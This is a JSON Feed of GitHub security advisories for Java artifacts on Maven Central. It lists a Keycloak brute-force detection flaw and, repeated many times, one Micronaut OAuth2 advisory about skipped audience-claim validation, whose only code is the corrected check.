{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Java artifacts hosted at the Maven central repository",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/maven.json",
    "description": "Security Advisory for Java artifacts hosted at the Maven central repository on GitHub",
    "items": [
        {
            "content_html": "<p>A flaw was found in Keycloak 4.2.1.Final, 4.3.0.Final. When TOPT enabled, an improper implementation of the Brute Force detection algorithm will not enforce its protection measures.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2018-14657\">https://nvd.nist.gov/vuln/detail/CVE-2018-14657</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2018:3592\">https://access.redhat.com/errata/RHSA-2018:3592</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2018:3593\">https://access.redhat.com/errata/RHSA-2018:3593</a></li>\n<li><a href=\"https://access.redhat.com/errata/RHSA-2018:3595\">https://access.redhat.com/errata/RHSA-2018:3595</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-14657\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-14657</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-85v8-vx4w-q684\">https://github.com/advisories/GHSA-85v8-vx4w-q684</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-85v8-vx4w-q684",
            "title": "[org.keycloak:keycloak-parent] Keycloak Improper Bruteforce Detection",
            "date_modified": "2023-10-05T21:50:40.000Z",
            "date_published": "2022-05-13T01:12:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-85v8-vx4w-q684"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) &amp;&amp;\n                        audiences.contains(clientId) &amp;&amp;\n                                validateAzp(claims, clientId, audiences);\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Any OIDC setup using Micronaut where multiple OIDC applications exists for the same issuer but token auth are not meant to be shared.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h\">https://github.com/micronaut-projects/micronaut-security/security/advisories/GHSA-qw22-8w9r-864h</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980\">https://github.com/micronaut-projects/micronaut-security/commit/9728b925221a0d87798ccf250657a3c214b7e980</a></li>\n<li><a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qw22-8w9r-864h\">https://github.com/advisories/GHSA-qw22-8w9r-864h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h",
            "title": "[io.micronaut.security:micronaut-security-oauth2] io.micronaut.security:micronaut-security-oauth2 has invalid IdTokenClaimsValidator logic on aud",
            "date_modified": "2023-10-05T20:55:17.000Z",
            "date_published": "2023-10-05T20:55:14.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qw22-8w9r-864h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>IdTokenClaimsValidator skips <code>aud</code> claim validation if token is issued by same identity issuer/provider.</p>\n<h3 id=\"details\">Details</h3>\n<p>See <a href=\"https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202\">https://github.com/micronaut-projects/micronaut-security/blob/master/security-oauth2/src/main/java/io/micronaut/security/oauth2/client/IdTokenClaimsValidator.java#L202</a></p>\n<p>This logic violates point 3 of <a href=\"https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation\">https://openid.net/specs/openid-connect-core-1_0.html#IDTokenValidation</a>. </p>\n<p>Workaround exists by setting <code>micronaut.security.token.jwt.claims-validators.audience</code> with valid values. \n <code>micronaut.security.token.jwt.claims-validators.openid-idtoken</code> can be kept as default on.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Should probably be:</p>\n<pre><code class=\"language-java\">                return issuer.equalsIgnoreCase(iss) 